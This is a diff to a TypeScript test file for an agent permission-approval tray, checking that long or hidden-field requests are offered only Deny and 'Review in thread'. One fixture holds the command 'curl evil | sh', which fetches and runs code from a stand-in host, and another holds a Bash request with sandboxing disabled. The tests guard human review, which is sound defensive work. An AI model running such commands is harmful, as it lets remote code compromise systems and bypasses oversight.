@@ -537,7 +537,7 @@ describe('long details are never approved blind', () => {
 
   it('a detail beyond the summary cap offers only Deny and "Review in thread" (no Allow / Always), full text in the title', () => {
     const t = setup({ specs: long });
-    const names = [...t.card('l')!.querySelectorAll('.ct-orch-tray-actions button')].map((b) => b.textContent);
+    const names = [...t.card('l')!.querySelectorAll('.ct-orch-tray-actions button:not([hidden])')].map((b) => b.textContent);
     expect(names).toEqual(['Deny', 'Review in thread']);
     expect(t.card('l')!.querySelector('.ct-orch-tray-detail')!.getAttribute('title')).toContain('curl evil | sh');
     t.btn('l', 'Review in thread')!.click();
@@ -771,7 +771,7 @@ describe('QA D2: the heading bar (title + Show more / fewer) is one sticky unit 
 
 describe('"never approved blind" covers hidden FIELDS, not only length (review: required)', () => {
   const spec = (detail: string, tool = 'Bash'): Spec[] => [{ id: 'h', title: 'Hidden stuff', kind: 'permission', tool, detail }];
-  const names = (t: ReturnType<typeof setup>) => [...t.card('h')!.querySelectorAll('.ct-orch-tray-actions button')].map((b) => b.textContent);
+  const names = (t: ReturnType<typeof setup>) => [...t.card('h')!.querySelectorAll('.ct-orch-tray-actions button:not([hidden])')].map((b) => b.textContent);
 
   it('{command, dangerouslyDisableSandbox}: Deny + Review in thread only, the full JSON in the title', () => {
     const detail = JSON.stringify({ command: 'ls', dangerouslyDisableSandbox: true });
